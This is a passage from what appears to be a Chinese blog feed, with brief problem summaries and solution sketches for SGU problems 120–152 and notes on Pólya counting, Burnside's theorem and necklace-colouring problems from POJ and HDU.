2 可得</p><script type="math/tex; mode=display">(A_0B-AB_0)x=(BK_0-B_0K)N \tag 3</script><p>两边同时对 $N$ 取模</p><script type="math/tex; mode=display">(A_0B-AB_0)x\equiv 0\pmod N \tag 4</script><p>该等式对于所有的 $x$ 均成立，即与 $x$ 无关，所以</p><script type="math/tex; mode=display">A_0B-AB_0\equiv 0\pmod N \tag 5</script><p>根据公式 5 可知 $A:B$ 值等于 $A_0：B_0$，这缩小了解的搜索范围。然而这只说明了必要性，还需要进一步证明充分性。</p><p>利用扩展欧几里得定理，可求得</p><script type="math/tex; mode=display">A_0x_0+B_0y_0=\gcd(A_0, B_0) \tag 6</script><p>要使右式为 $N$ 的倍数，可两边同时乘上 $ N / \gcd(\gcd(A_0, B_0), N)$</p><script type="math/tex; mode=display">A_0X_0+B_0Y_0=\frac{\gcd(A_0, B_0)}{\gcd(\gcd(A_0, B_0), N)} N \tag 7</script><p>其中，$X_0=x_0N / \gcd(\gcd(A_0, B_0), N)$，$Y_0=y_0N / \gcd(\gcd(A_0, B_0), N)$。</p><p>等式两侧同时除以 $\frac{\gcd(A_0, B_0)}{\gcd(\gcd(A_0, B_0), N)}$</p><script type="math/tex; mode=display">AX_0+BY_0=N\tag 8</script><p>其中，$A=A_0\frac{\gcd(\gcd(A_0, B_0), N)}{\gcd(A_0, B_0)},B=B_0\frac{\gcd(\gcd(A_0, B_0), N)}{\gcd(A_0, B_0)}$。</p><p>上述过程可将 $X_0, Y_0$ 替换成通解形式，结论仍然成立。</p><p>则 $\forall i\in [0, N)$, $(iA\mod N, iB\mod N)$ 均是解，但是可能存在重复。</p><hr><p>120 <strong>Archipelago</strong></p><p><strong>题意</strong>  给出正 $3\le N\le 150$ 边形的第 $N_1$ 个点坐标和第 $N_2$ 个点坐标，按序求出所有点的坐标。</p><p><strong>分析</strong>  </p><hr><p>121 <strong>Bridges painting</strong></p><p><strong>题意</strong>  给点数为 $1\le N\le 100$ 的无向图，给图中的每条边进行黑白染色，要求当顶点度数大于 1 时，该顶点至少与一条白边和一条黑边相连接。</p><p><strong>分析</strong>  </p><hr><p>122 <strong>The book</strong></p><p><strong>题意</strong>  给点数为 $2\le N\le 10^3$ 的无向图，每个点至少与 $[\frac {N+1}{2}]$ 个点相连，求一条<strong>哈密顿回路</strong>。</p><p><strong>分析</strong>  </p><hr><p>123 <strong>The sum</strong></p><p><strong>题意</strong>  求前 40 个斐波那契值的和。</p><p><strong>分析</strong>  模拟。</p><hr><p>124 <strong>Broken line</strong></p><p><strong>题意</strong>  给一边数为 $4\le K\le 10^4$ 的多边形，以及一个二维坐标点 $(X_0, Y_0)$，判断该点在多边形的内部、外部亦或边界上。数据保证多边形顶点坐标为整数，$X_0, Y_0$ 也为整数。</p><p><strong>分析</strong>   </p><hr><p>125 <strong>Shtirlits</strong></p><p><strong>题意</strong>  </p><p><strong>分析</strong>  </p><hr><p>126 <strong>Boxes</strong></p><p><strong>题意</strong>  有两个盒子，两个盒子分别有 $A,B$ 个球，在移动球时要放入盒中已有的等量的球，即操作一次后两个盒子的球数可能为 $2A, B-A$ 或 $A -B, 2B$  两种情况。求最少的操作次数使得一个盒子为空。数据保证 $0\lt A+B\lt 2147483648$。</p><p><strong>分析</strong>  考虑反向操作，记 $S=A+B$，则判断状态 $(0, S)$ 是否能导出 $(A, B)$。<strong>逆操作</strong>从状态 $(A, B)$ 可推出 $(\frac A2, B+\frac A2)$。</p><p>因为总和<strong>固定</strong>为 $S$，对于一个状态可以用<strong>两者的最小值</strong>表示，则状态有</p><script type="math/tex; mode=display">0→\frac S2→\frac S4→\frac S8,\frac {3S}8→\frac {S}{16},\frac {3S}{16},\frac {5S}{16},\frac {7S}{16}→\dots</script><p>可以发现有效状态构成了一棵高度最大为 $\log(S)$ 的二叉树。反过来考虑，对于任一有效状态转移到根状态 $(0, S)$ 的操作数不超过 $\log(S)$。因此对于初始状态 $(A, B)$ 在 32 步内判断是否根状态 $(0, S)$ 即可。</p><hr><p>127 <strong>Telephone directory</strong></p><p><strong>题意</strong>  给 $0\lt N\lt 8000$ 个号码，电话本每页能记录 $0\lt K \lt 255$ 个电话号码，要求号码按序记录在电话本上，并且首位不同的号码记录记录在不同页，要求计算记录号码的页数。</p><p><strong>分析</strong>  模拟。</p><hr><p>128 <strong>Snake</strong></p><p><strong>题意</strong>  给定 $4\le N\le 10^4$ 个整点 $-10^4\le x_i,y_i\le 10^4$，要求构造满足以下条件的多边形：</p><ol><li>$N$ 个点均为多边形的顶点；</li><li>每个顶点均构成一个直角；</li><li>多边形的边与坐标轴平行；</li><li>多边形无自交；</li><li>多边形的周长最短。</li></ol><p>如果能构成多边形，则输出多边形的周长，否则输出 0。</p><p><strong>分析</strong>  考虑 $y$ 坐标相同的若干个点 $(x_1, y), (x_2, y),\dots, (x_m, y)$。因为每个点连接一水平线段和一竖直线段，所以第一个点 $(x_1, y)$ 只能与 $(x_2, y)$ 相连，$(x_3, y)$ 与 $(x_4, y)$ 相连，以此类推。这要求 $m$ 必须是偶数，否则无解。</p><p>上述步骤完成后，需要判断所有点是否联通以及是否存在线段相交。对于线段相交问题，可以使用扫描线+线段树/树状数组解决。</p><hr><p>129 <strong>Inheritance</strong></p><p><strong>题意</strong>  给有 $3\le N \le 400$ 个点的凸包，以及 $2\le M\le 1000$ 条线段，判断每条线段被凸包包含的长度。</p><p><strong>分析</strong>  </p><hr><p>130 <strong>Circle</strong></p><p><strong>题意</strong>  圆上有 $2k$ 个点，其中 $1\le k \le 30$。现要求将点用线连接起来，使得：每个点都有线连接；圆被划分的区域数量最少，求不同的划分方案数以及最小区域数。</p><p><strong>分析</strong>  显然，最少区域为 $k+1$，每条连线不能有交点，根据该性质则连一条边后就生成两个子问题，于是使用动态规划解决。$dp(i)$ 表示 $2i$ 个点划分成最少区域的方案数，枚举该连线的左右两部分的规模进行转移：</p><script type="math/tex; mode=display">dp(i)=\sum_{j=0}^{i-1}dp(j)\times dp(i-1-j)</script><hr><p>131 <strong>Hardwood floor</strong></p><p><strong>题意</strong>  有一个 $N\times M$ 的网格，现使用 1×2 和 2×2 的方块填满网格（方块可旋转放置），求铺满网格的方案数，其中 $1\le N,M\le 9$。</p><p><strong>分析</strong>  状压 DP。</p><hr><p>132 <strong>Another Chocolate Maniac</strong></p><p><strong>题意</strong>  给定 $M\times N$  的网格，使用 1×2 和 2×1 的方块填充，其中 $1\le M\le 70, 1\le N\le 7$。网格部分格子不能与方块重叠，求使用最少数量的方块填充网格，使得网格不存在相邻的空白格子，即不能再放置方块。</p><p><strong>分析</strong>  轮廓线 DP。对于每个格子有 3 种状态：可放置、不可放置，必须放置。假设当前格子为 $(i, j)$ 且为空，上方的格子 $(i-1,j)$ 也为空，此时有两种方案：1. 在 $(i-1,j)$ 和 $(i, j)$ 中放方块；2. 不放方块，但是 $(i, j)$ 和 $(i+1,j)$ 必须放置方块。因此每个格子有 3 种状态，总的时间复杂度为 $O(NM3^N)$。</p><hr><p>133 <strong>Border</strong></p><p><strong>题意</strong>  给 $1\le N\le 16000$ 个一维区间 $[A_i, B_i]$。若一个区间 $[A_i, B_i]$ 被另一个区间 $[A_j, B_j]$ 完全覆盖，即 $A_j\lt A_i$ 且 $B_i \lt B_j$，则去除该区间。求被去除区间的数量。 </p><p><strong>分析</strong>  按 $A_i$ 为第一关键字，$B_i$ 为第二关键字排序，按 $A_i$ 划分阶段，实时维护最大 $B_j$，若 $B_i&lt;B_j$ 则去除当前区间。</p><hr><p>134 <strong>Centroid</strong></p><p><strong>题意</strong>  求树的重心。</p><p><strong>分析</strong>  遍历一遍树即可。</p><hr><p>135 <strong>Drawing Lines</strong></p><p><strong>题意</strong>  在无限平面上画 $N$ 条直线，求平面划分的区域数。</p><p><strong>分析</strong>  画图找规律，直线两两相交，结论为 $1+\frac {N(N+1)}2$。</p><hr><p>136 <strong>Erasing Edges</strong></p><p><strong>题意</strong>  给定 $3\le N \le 10^4$ 点多边形的边的中点 $(x_i, y_i)$，判断是否能够根据边中点复原多边形顶点，如果能复原按序给出顶点坐标。</p><p><strong>分析</strong>  </p><hr><p>138 <strong>Games of Chess</strong></p><p><strong>题意</strong>  有 $2\le N \le 100$ 个人轮流下象棋，每次两个人下棋并且胜者可继续下棋直至输棋。现已知每个人下棋的总局数，要求构造符合规则的一种方案，其胜者在第一个。数据保证有解，且所有人的总局数小于 $10^4$。</p><p><strong>分析</strong>  构造。总棋局数为每个人的总局数之和除以二。然后按每个人的局数从大到小排序，假设顺序为 $(r_1, c_1), (r_2, c_2),\dots$，其中 $r_i$ 表示 $id = c_i$ 的棋局数。构造方案为 $(c_1, ?),(c_1,?),\dots,(c_2, c1),(c_2,?),\dots$，优先排列胜者，最后一局输给下一个胜者完成衔接，剩余的棋手则安排在败者局中。</p><hr><p>139 <strong>Help Needed!</strong></p><p><strong>题意</strong>  十五数码问题。</p><p><strong>分析</strong>  </p><hr><p>140 <strong>Integer Sequences</strong></p><p><strong>题意</strong>  给定长为 $1\le N \le 100$ 的序列 $0\le A_i\le 2\times 10^9$，判断是否存在序列 $X_i$ 满足</p><script type="math/tex; mode=display">\sum A_iX_i \equiv B \pmod P</script><p>其中， $0\le B\lt P\le 10^4$。</p><p><strong>分析</strong>  扩展欧几里得算法。</p><hr><p>141 <strong>Jumping Joe</strong></p><p><strong>题意</strong>  一只青蛙在一维数轴的整数点上跳，每次能够向负轴或正轴方向跳 $x_1$ 或 $x_2$ 个整数距离，求能否<strong>刚好</strong> $0\le K\le 2\times 10^9$ 次跳到整点 $-4\times 10^4 \lt P\lt 4\times 10^4$ 位置上。如果能到达位置 $P$，给出一种方案 $(P_1, N_1, P_2, N_2)$，$P_i$ 表示往正轴方向跳 $x_i$ ，$N_i$ 则表示往负轴方向跳 $x_i$。</p><p><strong>分析</strong>  扩展欧几里得算法。</p><hr><p>142 <strong>Keyword</strong></p><p><strong>题意</strong>  给长为 $1\le N \le 5\times 10^5$ 的字符串，该串只由 $a$ 和 $b$ 构成，求最短的不是该串子串的字符串，并给出一个解。如 $aba$ 的子串有 $a,b,ab,ba,aba$，因此最短非子串长度为 2，一种解为 $aa$。</p><p><strong>分析</strong>  因为 $2^{19} &gt; 5\times 10^5$，所以答案不超过 19，枚举长度并枚举该长度所有子串即可。后缀数组和后缀自动机也可以做。</p><hr><p>145 <strong>Long Live the Queen</strong></p><p><strong>题意</strong>  给定有 $1\le N \le 16\times 10^4$ 的树，每个点的权值为 $-10^3\le w_i\le 10^3$，求一棵子树使得权重和最大。</p><p><strong>分析</strong>  树 DP。</p><hr><p>144 <strong>Meeting</strong></p><p><strong>题意</strong>  两个人约在 $[X,Y]$ 时间内碰面，约定先到的人等另一个人的时间不超过 $0\lt Z\le 60*(Y-X)$ 分钟，求两个人能碰面的概率。</p><p><strong>分析</strong>  。</p><hr><p>148 <strong>B-Station</strong></p><p><strong>题意</strong>  背景中有 $1\le N\le 15000$ 级蓄水池，每级蓄水池目前有 $0\le W_i\le 15000$ 重的水量，最大蓄水量为 $0\le L_i\le 15000$。释放第 $i$ 级蓄水池的代价为 $0\le P_i \le 15000$，且第 $i$ 级的水会流入第 $i+1$ 级的水池中。如果水池中的水超过了容量，则水池中的所有水会继续流入下一级。现在 kbfz 想要释放第 $N$ 级的水，求最小代价以及一种方案。 </p><p><strong>分析</strong>  为了释放第 $N$ 级的水，一种是直接花费 $P_N$ 的代价，另一种则是释放前面的水池，通过超容量来释放。假设第一个花费代价 $P_j$ 释放水池 $j$，则下一个必须花费代价的水池满足：</p><script type="math/tex; mode=display">\sum_{i=j}^k W_i \le L_k</script><p>即堆积的总水量不超过容量的第一个位置 $k$，该位置必须花费 $P_k$ 的代价释放水。</p><p>使用前缀和 $S_i$ 表示，则有</p><script type="math/tex; mode=display">S_k-S_{j-1}\le L_k \\\Rightarrow S_k-L_k\le S_{j-1}</script><p>当固定第一个花钱释放的水池 $j$ 后，在 $[j, N]$ 中必须花钱的水池满足 $S_k-L_k \le S_{j-1}$，其中 $S_k-L_k$ 是定值。之后使用数据结构维护 $S_k-L_k$ 所对应的代价即可。</p><hr><p>149 <strong>Computer Network</strong></p><p><strong>题意</strong>  给 $1\le N\le 10^4$ 个点的树，求每个点 $i$ 到其他点的最远距离 $S_i$。</p><p><strong>分析</strong>  每个点到树直径的端点的距离之一等于最远距离。</p><hr><p>150 <strong>Mr. Beetle II</strong></p><p><strong>题意</strong>  给定起点 $(x_1, y_1)$ 和终点 $(x_2, y_2)$，求起点和终点构成的线段穿过的第 $1\le n\le 10^5$ 个格子左下角坐标，只经过角点不算穿越该格子。每个格子可使用 $(x, y),(x,y+1),(x+1,y+1),(x+1, y)$ 表示，其中左下角点坐标为 $(x, y)$。</p><p><strong>分析</strong>  假设已知当前穿越的格子，则下一个可能穿越的格子为前进方向的相邻 3 个格子。线段穿越格子的充要条件：线段和格子的其中一条对角线严格相交。</p><hr><p>!!! 151 <strong>Construct a triangle</strong></p><p><strong>题意</strong>  对于三角形 ABC，已知长度 $|AB|=c,|AC|=b,|AM|=m$，其中 M​ 是线段 BC 的中点。求三个顶点的坐标，满足上述长度关系。</p><p>这道题<strong>数据有问题</strong>，允许三点共线。</p><p><strong>分析</strong>  固定点 A 在原点，点 B 为 $(c, 0)$，设点 C 坐标为 $(x, y)$。根据长度关系可得：</p><script type="math/tex; mode=display">x^2+y^2=b^2 \\(x+c)^2+y^2=4m^2</script><p>利用这个等式可以很容易求出一组解，注意判断方程有解即可。</p><hr><p>152 <strong>Making round</strong></p><p><strong>题意</strong>  已知 $1\le N\le 10^4$ 候选人的选票数 $0\le A_i\le 10^4$，现要求将选票转换成<strong>整数</strong>的百分比形式， 使得总和为 100。对于转换后小数部分，每个候选人的选票可向上或向下取整（取整相互独立）。求一种方案，或判断无法转换。 </p><p><strong>分析</strong>  模拟。</p><hr><p>xxx</p><p><strong>题意</strong>  </p><p><strong>分析</strong>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;计划&quot;&gt;&lt;a href=&quot;#计划&quot; class=&quot;headerlink&quot; title=&quot;计划&quot;&gt;&lt;/a&gt;计划&lt;/h1&gt;&lt;p&gt;计划一年内（截止 2021 年 1 月 1 日）把 SGU 500 刷完，形式以所有题目给出翻译后的简要题意和解题思路概要。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pólya计数法</title>
    <link href="http://mcginn7.github.io/2019/10/31/polya/"/>
    <id>http://mcginn7.github.io/2019/10/31/polya/</id>
    <published>2019-10-31T11:54:39.000Z</published>
    <updated>2021-06-19T01:48:45.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Necklace-of-Beads"><a href="#Necklace-of-Beads" class="headerlink" title="Necklace of Beads"></a>Necklace of Beads</h2><p><strong>来源</strong> <a href="http://poj.org/problem?id=1286" target="_blank" rel="noopener">POJ 1286</a></p><p><strong>题意</strong> 使用 RGB 三种颜色对长为 $0\le n\le 23$ 的项链染色，求本质不同的方案数。一种方案如果经过<strong>旋转</strong>或<strong>翻转</strong>得到另一种方案，两种方案视为同一种。</p><p><strong>注意</strong> $n=0$ 在本题中会出现，测试数据输出 0。</p><p><strong>分析</strong> 使用 Polya 计数公式求解，即对于正 $n$ 边形的顶点对称群</p><script type="math/tex; mode=display"> \{ρ_n^0=\iota,ρ_n,\dots, ρ_n^{n-1}, τ_1, τ_2, \dots, τ_n \}</script><p>的循环因子分解。</p><ol><li><p>旋转置换 $ρ_n^i,i=0,1,\dots n-1$ 的循环个数为</p><script type="math/tex; mode=display">\gcd(n, i)</script><p><strong>证明</strong> 旋转置换中的每个元素在一个有向圈 $s+ki=s(\%\ n)$ ，其中 $k$ 是最小正整数。那么 $n|ki$，令 $ki=lcm(n, i)=ni/\gcd(n, i)$，则 $k=n/\gcd(n, i)$。所以有向圈的长度为 $n/\gcd(n, i)$，个数为 $n/k=\gcd(n,i)$ 个。</p><p>根据定理 3 可得，</p><script type="math/tex; mode=display">|C(ρ_n^i)|=3^{\gcd(n, i)}</script></li><li><p>反射置换 $τ_i$ 需要根据 $n$ 的奇偶性考虑。</p><p>当 $n$ 为奇数时，有 $n$ 个关于角点与其对边中点的连线的反射，每个反射置换的型为</p><script type="math/tex; mode=display">(1, \frac{n-1}{2}, 0, \dots, 0)</script><p>根据定理 3 可得</p><script type="math/tex; mode=display">|C(τ_i)|=3^{\frac{n+1}{2}}</script><p>当 $n$ 为偶数时，有 $n/2$ 个关于对角点的反射和 $n/2$ 个关于对边中点连线的反射，两种置换的型分别为</p><script type="math/tex; mode=display">(2, \frac n2-1, 0, \dots, 0)\\(0, \frac n 2, 0, \dots, 0)</script><p>根据置换的型和定理 3 可求得 $|C(f)|$，最后使用 Burnside 定理即可求解不同着色的方案数。</p></li></ol><h2 id="Color"><a href="#Color" class="headerlink" title="Color"></a>Color</h2><p><strong>来源</strong> <a href="http://poj.org/problem?id=2154" target="_blank" rel="noopener">POJ 2154</a>，<a href="https://www.luogu.org/problem/P4980" target="_blank" rel="noopener">LG 4980</a></p><p><strong>题意</strong> 给定长为 $N\le 10^9$ 的项链，使用至多 $N$ 种颜色对项链上的珠子着色，考虑在<strong>旋转</strong>条件下的不同着色方案数，结果对 $1\le P \le 3\times 10^4$ 取模。</p><p><strong>分析</strong> 旋转置换 $ρ_n^i,i=0,1,\dots n-1$ 的循环个数为</p><script type="math/tex; mode=display">\gcd(n, i)</script><p>根据 Polya 定理，总方案数为</p><script type="math/tex; mode=display">Answer = \frac 1 n \sum_{0\le i \lt n} |C(\rho_n^i)|= \frac 1 n \sum_{0\le i \lt n} n^{\gcd(n, i)} \\= \frac 1 n \sum_{d|n}n^d\sum_{0\le i \lt n}[\gcd(n, i) =d] \\= \frac 1 n \sum_{d|n}n^d\sum_{0\le i \lt n}[\gcd(n/d, i/d) =1] \\= \frac 1 n \sum_{d|n}n^d\sum_{0\le i \lt n/d}[\gcd(n/d, i) =1] \\= \frac 1 n \sum_{d|n}n^d\phi(n/d) = \sum_{d|n}n^{d-1}\phi(n/d) \\</script><p>$O(\sqrt n)$ 枚举 $n$ 的所有约数 $d$（因为前 10 个质数乘积大于 $10^9$，因此约数个数最多只有 $2^{10}=1024$ 个），快速幂求 $n^{d-1}$，$O(\sqrt {n/d})$ 求 $\phi(n/d)$。</p><h2 id="Magic-Bracelet"><a href="#Magic-Bracelet" class="headerlink" title="Magic Bracelet"></a>Magic Bracelet</h2><p><strong>来源</strong> <a href="http://poj.org/problem?id=2888" target="_blank" rel="noopener">POJ 2888</a></p><p><strong>题意</strong> 给定长为 $1\le n \le 10^9$  的项链，使用 $1\le m \le 10$ 种颜色对项链上的珠子着色，考虑旋转同构的不同着色方案数，结果对 9973 取模。此外，限制部分颜色对不能着色于相邻的珠子上。数据保证 $gcd(n, 9973)=1$。</p><p><strong>分析</strong> 已知循环置换 $ρ_n^i$ 的循环个数为 $\gcd(n, i)$。对于一个循环圈可表示为 $j+ki(\mod n)$，则在同一个循环的元素 $x, y$ 要满足 $x \mod \gcd(n, i) = y \mod  \gcd(n, i)$，即循环节大小为 $\gcd(n, i)$。因为相邻珠子不能着限制颜色对，此时保证前 $\gcd(n, i) + 1$ 个元素不出现禁止的颜色对即可，问题转化成求解 $k$ 个珠子的项链不出现禁止颜色对的方案数。</p><p>转化后的问题可以使用动态规划解决，$dp(i, j)$ 表示前 $i$ 个元素中最后一个元素的颜色为 $j$ 的方案数。记不能相邻的颜色对集合为 $E$，则转移方程为</p><script type="math/tex; mode=display">dp(i, j) = \sum_{(k,j)\notin E}dp(i-1,k)</script><p>由于 $n$ 很大而 $m$ 很小，因此可以使用矩阵 + 快速幂解决。另一方面，项链首尾相接的问题可以通过枚举第一个元素的颜色解决。</p><h2 id="Birthday-Toy"><a href="#Birthday-Toy" class="headerlink" title="Birthday Toy"></a>Birthday Toy</h2><p><strong>来源</strong> <a href="http://acm.hdu.edu.cn/showproblem.php?pid=2865" target="_blank" rel="noopener">HDU 2865</a></p><p><strong>题意</strong> 使用 $4\le k \le 10^9$ 种颜色对形如图 1的项链着色，项链包括 $3\le N \le 10^9$ 个小珠子以及一个中心的大珠子。要求相邻珠子不能同色，求旋转同构的不同着色方案数，结果对 $10^9+7$ 取模。</p><img src="/2019/10/31/polya/image-20191102224432497.png"><p><center>图 1. 特殊形状的项链</center><br><strong>分析</strong> 由于中心点的大珠子与所有小珠子均相邻，因此可从 $k$ 种颜色中先选一种颜色对大珠子着色，使得问题转化为使用 $k-1$ 种颜色对普通项链着色。</p><p>进而本问题与 <strong>POJ 2888 Magic Bracelet</strong> 类似，问题进一步转化成长为 $L$ 的项链相邻珠子不同构的着色方案数。使用动态规划思想解决，$dp(i, j)$ 表示前 $i$ 个珠子最后一个颜色为 $j$ 的方案数，转移方程为</p><script type="math/tex; mode=display">dp(i, j) = \sum_k{dp(i-1,k)} - dp(i-1, j)</script><p>项链需要解决首尾相接问题，此时通过 $O(k)$ 枚举第一个元素的颜色解决。由于颜色数 $k$ 很大，因此不能使用线性递推的动态规划做法。</p><p>在枚举第一个元素的颜色时，不失一般性，假设第一个元素的颜色为 1，那么颜色 2,…,k 是等价的。可以理解为只用 2 种颜色着色，只是第 2 种颜色有 $k - 1$ 种替换， ​因此动态规划的状态只有 $dp(i, 1)$ 和 $dp(i, c), c=2,\dots, k$，因此转移方程可写成</p><script type="math/tex; mode=display">dp(i, 1) = dp(i-1, 1)+(k-1)dp(i, c) - dp(i-1,1) \\dp(i, c) = dp(i-1,1)+(k-1)dp(i, c)-dp(i-1,c) = dp(i-1,1)+(k-2)dp(i-2,c)</script><p>写成矩阵形式</p><script type="math/tex; mode=display">\begin{pmatrix}0&k-1\\1&k-2\end{pmatrix}\begin{pmatrix}dp(i-1,1)\\dp(i-1,c)\end{pmatrix}=\begin{pmatrix}dp(i,1)\\dp(i,c)\end{pmatrix}</script><p>使用快速幂优优化计划 $dp(i, 1)$，进而方案数为</p><script type="math/tex; mode=display">Answer = \frac 1 n \sum_{d|n} dp(d, 1)φ(n / d)</script><h1 id="《组合数学》摘录"><a href="#《组合数学》摘录" class="headerlink" title="《组合数学》摘录"></a>《组合数学》摘录</h1><h2 id="置换群与对称群"><a href="#置换群与对称群" class="headerlink" title="置换群与对称群"></a>置换群与对称群</h2><h3 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h3><p><strong>定义</strong> 设 $X$ 是一个有限集 $\{1, 2, \dots , n\}$，$X$ 的每个置换 $f$</p><script type="math/tex; mode=display">f(1)=i_1, f(2)=i_2, \dots , f(n)=i_n</script><p>可视为到其自身定义的一对一函数 $f:X\rightarrow X$，用 $2\times n $ 阵列表示：</p><script type="math/tex; mode=display">\begin{pmatrix}1&2&\dots&n\\i_1&i_2&\dots&i_n\end{pmatrix} \tag1</script><p>将 $\{1, 2, \dots, n\}$ 的所有 $n!$ 个置换构成的集合记为 $S_n$。</p><p><strong>运算</strong> 置换的合成运算“$\circ$”满足<strong>结合律</strong>，但不满足交换律：</p><script type="math/tex; mode=display">(f\circ g)\circ h=f\circ(g\circ h) \tag 2</script><p><strong>恒等置换</strong> 各数对应到自身的置换 $\iota$：</p><script type="math/tex; mode=display">\iota = \begin{pmatrix}1&2&\dots&n \\1&2&\dots&n \\\end{pmatrix} \tag 3</script><p><strong>逆函数</strong> 如果 $f(s)=k$，那么 $f^{-1}(k)=s$。</p><h3 id="置换群"><a href="#置换群" class="headerlink" title="置换群"></a>置换群</h3><p><strong>定义</strong> 若 $S_n$ 的非空子集 $G$ 为 $X$ 的一个<strong>置换群</strong>，则满足：</p><ol><li>$\forall f, g\in G, f\circ g \in G$，即合成运算的封闭性。</li><li>恒等置换 $\iota \in G$，即包含单位元。</li><li>$\forall f \in G，f^{-1}\in G$，即逆元的封闭性。</li></ol><p><strong>特殊</strong> $X=\{1, 2, \dots, n\}$ 的所有置换的集合 $S_n$ 是一个置换群，记为 $n$ <strong>阶对称群</strong>。集合 $G=\{\iota\}$ 也是一个置换群。</p><p><strong>性质</strong> 置换群满足<strong>消去律</strong>：若 $f\circ g=f\circ h$，那么 $g=h$。</p><h2 id="Burnside定理"><a href="#Burnside定理" class="headerlink" title="Burnside定理"></a>Burnside定理</h2><p>计算集合 $X$ 的不等价着色数。</p><p>设 $G$ 是 $X$ 的一个置换群，$C$ 是一个着色集合，使着色 $c$ 保持不变的集合：</p><script type="math/tex; mode=display">G(c)=\{f:f\in G, f\ast c=c\} \tag{4}</script><p>集合 $G(c)$ 称为 $c$ 的<strong>稳定核</strong>，任何着色的稳定核是一个置换群。</p><p>在 $f$ 作用下使着色 $c$ 保持不变的 $G$ 中所有着色的集合：</p><script type="math/tex; mode=display">C(f)=\{c:c\in C, f\ast c=c\} \tag 5</script><p><strong>定理1</strong> 对于每一种着色 $c$，$c$ 的稳定核 $G(c)$ 是一个置换群，且对 $G$ 中任意置换 $f,g$, $g\ast c=f\ast c$ 当且仅当 $f^{-1}\circ g$ 属于 $G(c)$。</p><p><strong>推论1</strong> 设 $c$ 为 $C$ 中的一种着色，那么与 $c$ <strong>等价的着色数</strong>等于 $G$ 中的置换个数除以 $c$ 的稳定核中的置换个数</p><script type="math/tex; mode=display">|\{f\ast c:f\in G\}|=\frac{|G|}{|G(c)|} \tag 6</script><p><strong>证明</strong> 对于 $h\in G(c)$，有 $(f\circ h)\ast c=f\ast (h\ast c)=f\ast c$，从而对于每个置换 $f$，恰好存在 $|G(c)|$ 个置换，这些置换作用在 $c$ 上跟 $f$ 有同样的效果。</p><p><strong>定理2</strong> 设 $G$ 是 $X$ 的一个置换群，$C$ 是 $X$ 的一个着色集并且使得对于 $G$ 中的任意 $f$ 与 $C$ 中的任意 $c$，$f\ast c\in C$，则 $C$ 中不等价的着色数 $N(G, C)$ 为</p><script type="math/tex; mode=display">N(G, C)=\frac1 {|G|} \sum_{f\in G}|C(f)| \tag 7</script><p>换言之，$C$ 中不等价的着色数等于使着色通过 $G$ 中的置换保持不变的着色的平均数。</p><p><strong>证明</strong> 计数满足 $f\ast c=c$ 的 $(f, c)$ 个数。使用两种不同的方式计数，然后使计数相等。</p><p>一种从置换 $f$ 考察，根据<strong>等价着色的定义</strong>计数结果为</p><script type="math/tex; mode=display">\sum_{f\in G} |C(f)| \tag 8</script><p>一种从着色 $c$ 考察，每个 $c$ 对结果的贡献为</p><script type="math/tex; mode=display">|G(c)|=\frac{|G|}{(与 c 等价的着色数)} \tag 9</script><p>计数结果为</p><script type="math/tex; mode=display">\sum_{c \in C} \frac{|G|}{(与c等价的着色数)} \tag {10}</script><p>按等价类（根据置换群的性值，等价具有传递性）将着色归类，每个等价类的总贡献为 $|G|$，等价类的个数就是不等价类的着色数 $N(G, C)$，因此公式(10) 等于</p><script type="math/tex; mode=display">N(G,C)\times |G| \tag {11}</script><p>联立公式(8) 和公式(11) 得到</p><script type="math/tex; mode=display">\sum_{f\in G}|C(f)|=N(G, C)\times |G| \tag {12}</script><h2 id="Polya计数公式"><a href="#Polya计数公式" class="headerlink" title="Pólya计数公式"></a>Pólya计数公式</h2><p>通过考虑置换的循环结构，计算可变得容易简便。</p><p>设 $f$ 是 $X=\{1, 2, \dots, n\}$ 的一个置换，$D_f=(X, A_f)$ 是顶点集为 $X$ 且弧集为</p><script type="math/tex; mode=display">A_f = \{(i, f(i)):i\in X\}</script><p>的有向图。该有向图有 $n$ 个顶点与 $n$ 条弧，各顶点的入度和出度等于1，因此弧集 $A_f$ 被划分为若干个有向圈，且每个顶点恰好只属于一个有向圈。</p><p>如果某些元素以循环的方式被置换且余下元素保持不变，那么称这样的置换为<strong>循环置换</strong>或简称<strong>循环</strong>。如果循环中的元素个数为 $k$，则称它为 $k-$循环。</p><p>设 $f$ 是集合 $X$ 的任意置换，关于合成运算 $f$ 有化成循环的因子分解</p><script type="math/tex; mode=display">f=[i_1\ i_2\ \dots\ i_p]\circ[j_1\ j_2\ \dots\ j_q]\circ\dots\circ[l_1\ l_2\ \dots\ l_r] \tag {13}</script><p>公式(13) 称为 $f$ 循环因子分解。</p><p>对于 $f$ 分解中的每个循环，该循环中的所有元素着色相同，因此着色方案数与循环阶数无关，而与循环个数有关。置换 $f$ 的循环因子分解中的循环个数记为</p><script type="math/tex; mode=display">\#(f)</script><p><strong>定理3</strong> 设 $f$ 是集合 $X$ 的一个置换，假如用 $k$ 种颜色对 $X$ 的元素进行着色，令 $C$ 是 $X$ 的所有着色的集合，则 $f$ 保持 $C$ 中着色不变的着色数为</p><script type="math/tex; mode=display">|C(f)|=k^{\#(f)}</script><p>假设 $f$ 的循环因子分解有 $e_i$ 个 $i$-循环，因 $X$ 的各元素在 $f$ 循环因子分解中恰好出现在一个训话中，所以 $e_i$ 是非负整数且满足</p><script type="math/tex; mode=display">\sum_{i=1}^{n}ie_i=n \tag {14}</script><p>称 $n$ 元组 $(e_1, e_2, \dots, e_n)$ 是置换 $f$ 的<strong>型</strong>，记为</p><script type="math/tex; mode=display">type(f)=(e_1, e_2, \dots, e_n)</script><p>循环数为</p><script type="math/tex; mode=display">\#(f)=e_1+e_2+\dots+e_n</script><p>因为置换的型仅取决于循环因子分解中循环的阶数，所以不同置换可以有相同的型，我们可引进 $n$ 个不定元</p><script type="math/tex; mode=display">z_1, z_2, \dots, z_n</script><p>其中，$z_k$ 对应一个 $k$ 阶循环（$k=1, 2, \dots, n$）。对于具有 $type(f)=(e_1, e_2, \dots, e_n)$ 的每个置换 $f$，定义 $f$ 的<strong>单项式</strong>为</p><script type="math/tex; mode=display">mon(f)=z_1^{e_1}z_2^{e_2}\dots z_n^{e_n}</script><p>设 $G$ 是 $X$ 的一个置换群。对 $G$ 中每个置换 $f$ 的单项式求和，得到关于 